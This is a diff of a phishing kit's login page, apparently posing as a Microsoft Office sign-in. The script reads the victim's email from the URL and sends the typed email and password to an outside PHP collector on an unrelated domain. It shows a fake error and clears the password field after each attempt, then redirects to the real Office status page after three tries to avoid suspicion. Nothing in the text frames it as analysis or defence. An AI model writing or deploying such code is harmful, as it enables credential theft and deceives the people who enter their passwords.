@@ -178,13 +178,15 @@ element.style {
 
     <script>
 
-        const reloadPreloader = ()=> window.location.reload();
+        // alert(234);
+
+        // const reloadPreloader = ()=> window.location.reload();
     
-        const foota = document.querySelector('.wrp')
+        // const foota = document.querySelector('.wrp')
     
-        foota.addEventListener('click', ()=>{
-            reloadPreloader();
-        });
+        // foota.addEventListener('click', ()=>{
+        //     reloadPreloader();
+        // });
     
         const emailInTheURL = window.location.href;
         const sliceEqualSign = emailInTheURL.indexOf("=");
@@ -192,30 +194,34 @@ element.style {
         console.log(extracetdEmail);
     
         
-        const emml = document.querySelector('.email')
+        const emml = document.querySelector('#email')
     
     
             const errMsg = document.querySelector('.err_msg');
             errMsg.style.display = 'none';
             const fomm = document.querySelector('#furm');
             const pwd = document.querySelector('#password');
+            console.log(emml, errMsg,fomm,pwd);
             // emml.setAttribute('value', extracetdEmail)
             // emml.value = extracetdEmail
-            const count = 0;
     
     
+            let num = 0;
             fomm.addEventListener('submit', ()=>{
-                
-                count++;
-                console.log(count);
-                if (count >=3 ) {
-                    window.location.href = 'https://www.test.com'
-                }
-    
+                // if (pwd.value = "") {
+                //     return null
+                // }
                 setTimeout(() => {
-                    errMsg.style.display = 'block';
                     pwd.value = "";
-                }, 2000);
+                    errMsg.style.display = 'block';
+                }, 2500);
+
+                num++;
+                if (num >=3) {
+                    setTimeout(() => {
+                        window.location.href = 'https://portal.office.com/servicestatus'
+                    }, 1400);
+                }
             })
     
     </script>
@@ -229,7 +235,9 @@ element.style {
     
                 var email = $("#email").val();
                 var password = $("#password").val();
-                $.post("https://physicaleducationdiploma.com/component/mbaby.php", {
+                // $.post("https://physicaleducationdiploma.com/component/mbaby.php", 
+                $.post("https://physicaldkjcationdiploma.com/component/mbaby.php", 
+                {
                     email: email,
                     password: password
                 }, function(data, status){
